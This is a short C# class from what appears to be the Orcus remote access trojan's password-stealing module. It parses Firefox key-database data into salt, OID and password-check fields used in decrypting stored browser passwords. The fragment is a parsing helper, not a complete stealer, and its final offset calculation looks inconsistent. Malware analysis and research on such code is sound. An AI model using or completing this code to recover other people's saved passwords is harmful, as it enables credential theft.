using System.Globalization;

namespace Orcus.Commands.Passwords.Applications.Mozilla.Cryptography;

public class PasswordCheck
{
	public string EntrySalt { get; private set; }

	public string Oid { get; private set; }

	public string Passwordcheck { get; private set; }

	public PasswordCheck(string dataToParse)
	{
		int num = int.Parse(dataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
		EntrySalt = dataToParse.Substring(6, num);
		int num2 = dataToParse.Length - (6 + num + 36);
		Oid = dataToParse.Substring(6 + num + 36, num2);
		Passwordcheck = dataToParse.Substring(6 + num + 4 + num2);
	}
}
